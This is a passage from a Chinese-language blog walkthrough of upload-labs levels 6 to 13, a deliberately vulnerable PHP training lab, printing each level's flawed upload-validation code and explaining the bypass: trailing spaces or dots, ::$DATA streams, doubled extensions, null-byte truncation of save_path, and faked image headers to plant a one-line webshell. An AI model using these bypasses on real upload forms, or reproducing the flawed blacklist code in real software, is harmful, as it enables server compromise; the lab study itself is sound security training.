<p>我们需要修改成本地地址<br>打开cmd使用ipconfig查看当前地址，将127.0.0.1改为当前地址，出现这个页面就说明连接成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407155130449.png" alt="image-20200407155130449"></p>
<p>使用ipconfig可以查看本地ip等等</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585786793204.png" alt="1585786724856"></p>
<h4 id="upload-labs第六关"><a href="#upload-labs第六关" class="headerlink" title="upload-labs第六关"></a>upload-labs第六关</h4><h5 id="代码分析-3"><a href="#代码分析-3" class="headerlink" title="代码分析"></a>代码分析</h5><p>可以看到，相比于上面Pass-05代码，这里将文件后缀名统一进行了小写转换，但是没有去除文件名首尾的空格。所以此处可以利用windows系统的命名规则进行绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为Windows特性所以不能在Windows下加空格，在kali中加入空格</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407172124838.png" alt="image-20200407172124838"></p>
<p>进行上传，页面返回空白</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407172944247.png" alt="image-20200407172944247"></p>
<p>查看根目录</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407173101652.png" alt="image-20200407173101652"></p>
<h4 id="upload-labs第七关"><a href="#upload-labs第七关" class="headerlink" title="upload-labs第七关"></a>upload-labs第七关</h4><h5 id="代码分析-4"><a href="#代码分析-4" class="headerlink" title="代码分析"></a>代码分析</h5><p>从代码上看，可以发现相比于Pass-06代码，加上了首尾去空，但是却少了尾部去点。故和上面Pass-06一样，利用windows文件命名规则绕过。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在php后面加一个.</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407173907933.png" alt="image-20200407173907933"></p>
<p>上传，并查看</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407174027297.png" alt="image-20200407174027297"></p>
<p>查看根目录</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407174059887.png" alt="image-20200407174059887"></p>
<h4 id="upload-labs第八关"><a href="#upload-labs第八关" class="headerlink" title="upload-labs第八关"></a>upload-labs第八关</h4><h5 id="代码分析-5"><a href="#代码分析-5" class="headerlink" title="代码分析"></a>代码分析</h5><p>可以看到，与前面第七关的代码相比，少了去除文件名的”::$DATA”字符串这一步。这里还是利用windows的一个特性。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$ DATA。</p>
<p>简单讲就是在php+windows的情况下：如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。</p>
<p><em>注:仅windows适用</em></p>
<h5 id="更改文件名"><a href="#更改文件名" class="headerlink" title="更改文件名"></a>更改文件名</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407174419725.png" alt="image-20200407174419725"></p>
<p>上传</p>
<p><img src="/2020/04/08/upload-labs%E5%85%B3%E5%8D%A1/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200407174444629.png" alt="image-20200407174444629"></p>
<p>查看根目录</p>
<p><img src="/2020/04/08/upload-labs%E5%85%B3%E5%8D%A1/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200407174456829.png" alt="image-20200407174456829"></p>
<h4 id="upload-labs第九关"><a href="#upload-labs第九关" class="headerlink" title="upload-labs第九关"></a>upload-labs第九关</h4><h5 id="代码分析-6"><a href="#代码分析-6" class="headerlink" title="代码分析"></a>代码分析</h5><p>可以看到，这里代码的安全性比之前的都要更高，黑名单类型全，大小写经过转换，去除了文件名末尾的点，去除了文件名尾空格，还去除了::$DATA。。但是，这里还是可以绕过的。<strong>这里的代码逻辑是先删除文件名末尾的点，再进行首尾去空。</strong>都只进行一次。故可以构造点空格点进行绕过，也就是后缀名改为<code>xx.php. .</code>，也是利用了Windows的特性。<br> 也就是说，如果从第三关到第九关，如果目标服务器是windows系统的话，均可用点空格点绕过。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>更改文件名</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407174734363.png" alt="image-20200407174734363"></p>
<p>上传，返回空白图片</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407174757325.png" alt="image-20200407174757325"></p>
<p>查看根目录</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407174807082.png" alt="image-20200407174807082"></p>
<h4 id="upload-labs第十关"><a href="#upload-labs第十关" class="headerlink" title="upload-labs第十关"></a>upload-labs第十关</h4><h5 id="代码分析-7"><a href="#代码分析-7" class="headerlink" title="代码分析"></a>代码分析</h5><p>这里代码没有了之前关卡里的去除文件尾点、空格、::$DATA的操作，估计是针对非Windows系统的。这里存在的问题是，利用str_ireplace对黑名单里的文件后缀名进行了替换，换成空字符，使用了str_ireplace函数，即不区分大小写，故大小写绕过不适用。但是这里替换是替换成了空字符，于是我们可以双写后缀名，如<code>.pphphp</code>,使得替换后的后缀名为php。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);</span><br><span class="line"></span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; str_ireplace($deny_ext,&quot;&quot;, $file_name);</span><br><span class="line">        if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name)) &#123;</span><br><span class="line">            $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; .$file_name;</span><br><span class="line">            $is_upload &#x3D; true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>更改文件后缀名</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407175030777.png" alt="image-20200407175030777"></p>
<p>上传文件，返回空白图片</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407175059266.png" alt="image-20200407175059266"></p>
<p>查看根目录</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407175128156.png" alt="image-20200407175128156"></p>
<h4 id="upload-labs第十一关"><a href="#upload-labs第十一关" class="headerlink" title="upload-labs第十一关"></a>upload-labs第十一关</h4><h5 id="代码分析-8"><a href="#代码分析-8" class="headerlink" title="代码分析"></a>代码分析</h5><p>这里与之前代码相比，使用了白名单，只允许上传，jpg，png，gif三种格式文件。</p>
<p>0x00是十六进制表示方法，是ascii码为0的字符，在有些和函数处理时，会把这个字符当做结束符</p>
<p>系统在对文件名的读取时，如果遇到0x00，就会认为读取已结束</p>
<p>date()随机数和rand()时间，以及最后添加文件扩展名$file_ext，这样就可以在date(“YmdHis”)后面加入0x00截断，使$file_ext被添加的文件后缀名不会被执行成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if(isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">    $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);</span><br><span class="line">    $file_ext &#x3D; substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);</span><br><span class="line">    if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">        $img_path &#x3D; $_GET[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line"></span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload &#x3D; true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg &#x3D; &#39;上传失败！&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">截断条件：</span><br><span class="line"> 1、php版本小于5.3.4</span><br><span class="line"> 2、php.ini的magic_quotes_gpc为OFF状态</span><br></pre></td></tr></table></figure>

<p>将其改为OFF状态</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407200436602.png" alt="image-20200407200436602"></p>
<p>首先新建一个1.php的文件，将其里面写入一句话木马</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406081237206.png" alt="image-20200406083446465"></p>
<p>写入一句话木马后，在将文件改名为1.jpg或者png只要是允许上传的文件格式就可以</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406083134693.png" alt="image-20200406081237206"></p>
<p>进行上传，使用burp抓包，然后将burp中的信息进行稍微修改</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406083446465.png" alt="image-20200406083134693"></p>
<p>修改完成后运行包通过，页面会返回空白图片，右击点击图片地址。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406083622923.png" alt="image-20200406083622923"></p>
<p>在新的页面将地址粘贴，粘贴完不能直接执行，需要将红线处的内容删除，也就是1.php后的内容删除，否则报错</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406083751706.png" alt="image-20200406084954651"></p>
<p>删除之后在进入页面，返回phpinof的页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406083843607.png" alt="image-20200406085245844"></p>
<p>这就是GTE截断。</p>
<h4 id="upload-labs第十二关"><a href="#upload-labs第十二关" class="headerlink" title="upload-labs第十二关"></a>upload-labs第十二关</h4><h5 id="代码分析-9"><a href="#代码分析-9" class="headerlink" title="代码分析"></a>代码分析</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if(isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">    $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);</span><br><span class="line">    $file_ext &#x3D; substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);</span><br><span class="line">    if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">        $img_path &#x3D; $_POST[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line"></span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload &#x3D; true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg &#x3D; &quot;上传失败&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在POST请求中，%00不会被自动解码，需要在16进制中进行修改00</p>
<p>创建一个php文件，写入一句话木马，然后更改为可上传格式，进行上传burp抓包</p>
<p>这里加入空格的原因是因为%00不会被自动解码，需要在16进制中修改，因为加入空格已知他是16进制的20，所以在HEX只需要找到位置将20修改为00就可以截断</p>
<p>这里代码与上面Pass-11代码类似，不过是save_path参数由GET传入变为POST传入，利用原理也是00截断</p>
<p>为了绕过类似的MIME Sniff的功能，常见的攻击技巧是伪造一个合法的文件头，而将真实的PHP等脚本代码附在合法的文件头之后</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406084954651.png" alt="image-20200406083751706"></p>
<p>在HEX子模块中找到1.php空格，找到20</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406085245844.png" alt="image-20200406083843607"></p>
<p>找到20之后，要将他修改为00</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406085344970.png" alt="image-20200406085759324"></p>
<p>修改执行点击forward进行上传，返回一个空白图片，右键复制图片连接</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406085602285.png" alt="image-20200406085602285"></p>
<p>在新的浏览器打开，当然还是需要将php格式后面的删除，成功访问</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406085759324.png" alt="image-20200406085344970"></p>
<p><strong>注意：</strong>截断需要关闭GPC否则会上传失败</p>
<h4 id="upload-labs第十三关"><a href="#upload-labs第十三关" class="headerlink" title="upload-labs第十三关"></a>upload-labs第十三关</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gif文件头表示GIF89a</span><br><span class="line"></span><br><span class="line">png文件头标识 (8 bytes) 89 50 4e 47 0d 0a 1a 0a</span><br><span class="line"></span><br><span class="line">jpg文件头标识 (2 bytes): ff, d8</span><br></pre></td></tr></table></figure>

<h5 id="代码分析-10"><a href="#代码分析-10" class="headerlink" title="代码分析"></a>代码分析</h5><p>这里代码意思是，将上传的文件读取先读取两字节，通过对比文件头来确认文件类型。<br> 于是就可以制作图片马，将php语句隐藏在图片中，然后结合文件包含漏洞执行php。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function getReailFileType($filename)&#123;</span><br><span class="line">    $file &#x3D; fopen($filename, &quot;rb&quot;);</span><br><span class="line">    $bin &#x3D; fread($file, 2); &#x2F;&#x2F;只读2字节</span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo &#x3D; @unpack(&quot;C2chars&quot;, $bin);    </span><br><span class="line">    $typeCode &#x3D; intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]);    </span><br><span class="line">    $fileType &#x3D; &#39;&#39;;    </span><br><span class="line">    switch($typeCode)&#123;      </span><br><span class="line">        case 255216:            </span><br><span class="line">            $fileType &#x3D; &#39;jpg&#39;;</span><br><span class="line">            break;</span><br><span class="line">        case 13780:            </span><br><span class="line">            $fileType &#x3D; &#39;png&#39;;</span><br><span class="line">            break;        </span><br><span class="line">        case 7173:            </span><br><span class="line">            $fileType &#x3D; &#39;gif&#39;;</span><br><span class="line">            break;</span><br><span class="line">        default:            </span><br><span class="line">            $fileType &#x3D; &#39;unknown&#39;;</span><br><span class="line">        &#125;    </span><br><span class="line">        return $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if(isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">    $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">    $file_type &#x3D; getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    if($file_type &#x3D;&#x3D; &#39;unknown&#39;)&#123;</span><br><span class="line">        $msg &#x3D; &quot;文件未知，上传失败！&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $img_path &#x3D; $UPLOAD_ADDR.&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type;</span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload &#x3D; true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg &#x3D; &quot;上传失败&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从这一关开始上传图片马，结合文件包含进行攻击。</p>
<p>查看提示</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407210648001.png" alt="image-20200407210648001"></p>
<h5 id="绕过方法-4"><a href="#绕过方法-4" class="headerlink" title="绕过方法"></a>绕过方法</h5><ul>
<li>服务端检测文件头，并将上传文件的后缀重命名为检测到的文件类型</li>
<li>关于服务端检测文件头，我们可以在文件起始加入<code>jpg|png|gif</code>文件的文件头来绕过</li>
</ul>
<blockquote>
